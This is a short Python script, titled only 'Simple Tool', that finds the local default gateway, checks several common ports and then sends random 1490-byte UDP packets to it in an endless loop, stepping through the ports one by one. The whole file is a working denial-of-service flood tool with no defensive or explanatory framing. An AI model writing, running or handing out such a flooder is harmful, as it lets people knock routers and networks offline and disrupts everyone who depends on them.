import socket, os, random, time, subprocess, platform, re

# time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

def get_gateway():
    system = platform.system()

    try:
        if system == "Windows":
            result = subprocess.check_output(
                ["ipconfig"], encoding="cp850", errors="ignore"
            )
            match = re.search(
                r"Default Gateway[.\s]*:\s*(\d{1,3}(?:\.\d{1,3}){3})",
                result
            )
            if match:
                return match.group(1)

        elif system == "Linux":
            result = subprocess.check_output(
                ["ip", "route"], encoding="utf-8", errors="ignore"
            )
            match = re.search(r"default via (\d{1,3}(?:\.\d{1,3}){3})", result)
            if match:
                return match.group(1)

    except:
        return None

    return None

def scan_ports(ip):
    print(f"\nScanning gateway {ip}...\n")

    common_ports = [21, 22, 23, 53, 80, 443, 8080]

    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        result = sock.connect_ex((ip, port))
        sock.close()

        if result == 0:
            return port  

    return None  


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
# os.system("clear")
os.system("cls" if os.name == "nt" else "clear")
print("===== Simple Tool =====")
print()
input("Press Enter to start...")
gateway = get_gateway()
if gateway:
  port = scan_ports(gateway)
  if port:
    # os.system("clear")
    os.system("cls" if os.name == "nt" else "clear")
    print(f"started on {hour}.{minute} | {day}-{month}-{year}")
    time.sleep(3)
    print
    sent = 0
    while True:
      sock.sendto(bytes, (gateway, port))
      sent = sent + 1
      port = port + 1
      print ("Sent %s packet to %s throught port:%s"%(sent,gateway,port))
      if port == 65534:
        port = 1
